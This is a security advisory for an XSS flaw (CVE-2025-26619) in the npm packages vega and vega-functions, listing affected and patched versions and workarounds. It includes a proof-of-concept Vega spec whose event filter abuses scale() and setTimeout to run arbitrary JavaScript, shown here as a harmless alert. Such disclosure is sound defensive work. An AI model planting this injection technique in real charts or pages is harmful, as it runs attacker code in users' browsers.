# [M] Vega Cross-Site Scripting (XSS) via event filter when not using CSP mode expressionInterpeter

## Summary
Severity: Medium
Advisory: GHSA-rcw3-wmx7-cphr
CVE: CVE-2025-26619
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2025-03-27
Source: https://github.com/advisories/GHSA-rcw3-wmx7-cphr
Type: github-advisory

## Affected
- npm: `vega` — affected >=0 <5.31.0
- npm: `vega-functions` — affected >=0 <5.16.0

## Details
### Impact

In `vega` 5.30.0 and lower,  `vega-functions` 5.15.0 and lower , it was possible to call JavaScript functions from the Vega expression language that were not meant to be supported.

### Patches

Patched in `vega` `5.31.0`  / `vega-functions` `5.16.0`

### Workarounds

_Is there a way for users to fix or remediate the vulnerability without upgrading?_

- Run `vega` without `vega.expressionInterpreter`. This mode is not the default as it is slower. 
- Using the interpreter [described in CSP safe mode](https://vega.github.io/vega/usage/interpreter/) (Content Security Policy) prevents arbitrary Javascript from running, so users of this mode are not affected by this vulnerability.

### References

- Reported to Vega-Lite by @kprevas Nov 8 2024 in https://github.com/vega/vega-lite/issues/9469 &  https://github.com/vega/vega/issues/3984

Reproduction of the error in Vega by @mattijn 

```
{
  "$schema": "https://vega.github.io/schema/vega/v5.json",
  "signals": [
    {
      "name": "inject_alert",
      "on": [
        {
          "events": [
            {
              "type": "mousedown",
              "marktype": "rect",
              "filter": ["scale(event.view.setTimeout, 'alert(\"alert\")')"]
            }
          ],
          "update": "datum"
        }
      ]
    }
  ],
  "marks": [
    {
      "type": "rect",
      "encode": {
        "update": {
          "x": {"value": 0},
          "y": {"value": 0},
          "width": {"value": 100},
          "height": {"value": 100}
        }
      }
    }
  ]
}
```

## References
- https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr
- https://nvd.nist.gov/vuln/detail/CVE-2025-26619
- https://github.com/vega/vega-lite/issues/9469
- https://github.com/vega/vega/issues/3984
- https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c
- https://github.com/vega/vega
